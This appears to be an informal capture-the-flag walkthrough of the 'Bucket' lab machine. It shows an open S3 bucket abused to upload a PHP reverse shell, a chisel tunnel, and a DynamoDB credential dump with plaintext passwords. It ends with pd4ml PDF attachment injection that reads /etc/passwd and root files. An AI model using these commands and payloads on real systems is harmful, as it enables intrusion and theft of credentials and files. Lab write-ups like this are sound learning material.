Started with a nmap scan
```
22 OpenSSH 8.2p1
80 Apache 2.4.41
```
The nmap scan shows there is a redirect to `http://bucket.htb/` doing a subdomain scan did not find any subdomains but when looking at the site its a static site but there is one subdomain `s3` which means we probley have to exploit amazon s3 bucket also hints from the name of the machine but going to check if there is any thing on the site going to start a gobuster scan
```
/index.html

s3 buckets
/shell  redirects 444af250749d:4566/shell/
/health
```
were going to  list all the buckets  `aws --endpoint-url http://s3.bucket.htb s3 ls` and we get `adserver` so now going to test if we can upload files and we can `aws --endpoint-url http://s3.bucket.htb s3 mv ./test.txt s3://adserver/` and if we go to `s3.bucket.htb/adserver/test.txt` and we get the contents of the file back now to add a reverse shell `aws --endpoint-urlhttp://s3.bucket.htb s3 cp shell.php s3://adserver` now we start the listener and got to `http://bucket.php/shell.php` and now we are `www-data` looking around on the file system we can go to the `roy` user project folder and we can read `db.php` which is hosting `DynamoDB` and we need to use aws client which is also on the host to connect to it since we cant configure creds on the machine we need to put chisel on the host and set a reverse proxy so on are host we do `chsiel server --reverse --port 8000` and on the machine we do `chisel client are-ip:8000 R:4566:localhost:4566` now we need to enumerate the DynamoDB with this command we list the buckets `aws dynamodb list-tables --region us-east-1 --endpoint-url http://localhost:4566` and we get a table name of `users` now we need to discribe the table `aws dynamodb describe-table --table-name users --region us-east-1 --endpoint-url http://localhost:4566` now to dump whats in side the table `aws dynamodb scan --table-name users --region us-east-1 --endpoint-url http://localhost:4566` and we got some users and passwords now 
```
Mgmt:Management@#1@#
Cloudadm:Welcome123!
sysadm:n2vM-<_K_Q:.Aa2
```
and with one of these logins we can get to the `roy` user while enumerating the host as roy we find another bucket site on port `8000` so we also forward this port with SSH to make it easy and its not much but looking at the source code of the` index.php` file we can see we need to use the site to make a PDF file with the title `Ransomware` and we can do this from are host with this command this one makes the tables
```
aws --endpoint-url=http://localhost:4566 dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE -- provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5
```
and this one makes the PDF
```
aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"

# test

"}}'
```
and now we have the pdf file and a html file after that we need to run this to make the PDF on the host
`curl http://localhost:8000/index.php -d 'action=get_alerts'`
and now we can download the file from `http://localhost:8000/files/result.pdf` and we can see in the tags that its `pd4ml` and we can also embed attachments into the pdf file so we can run this command
```
aws --endpoint-url=http://localhost:4566 dynamodb put-item --table-name alerts --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment src='\''file:///etc/passwd'\'' description='\''test'\'' icon='\''Paperclip'\''/></html>"}}'
```
and now we can open the attachment and we see the `/etc/passwd` and now we can do the same for `/root/root.txt` and we have the final flag 